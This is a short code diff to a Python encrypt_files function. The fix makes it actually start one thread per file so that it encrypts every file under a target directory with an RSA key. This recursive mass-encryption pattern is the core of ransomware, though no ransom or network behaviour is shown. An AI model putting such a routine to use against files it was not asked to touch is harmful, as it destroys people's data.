@@ -417,15 +417,16 @@ def encrypt_files(args):
             return res
 
         if os.path.isdir(target):
-            threads = []
+            loc_threads = []
             for root, _, files in os.walk(target):
                 for file in files:
                     file_path = os.path.join(root, file)
                     thread = threading.Thread(target=encrypt_file, args=(file_path, rsa_key,))
-                    threads.append(thread)
+                    loc_threads.append(thread)
+                    thread.start()
                     print(f"Encrypting {file_path}")
 
-            for thread in threads:
+            for thread in loc_threads:
                 thread.join()
             # globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
             # globals()['threads']['encrypt_files'] = _threader(rsa_key)
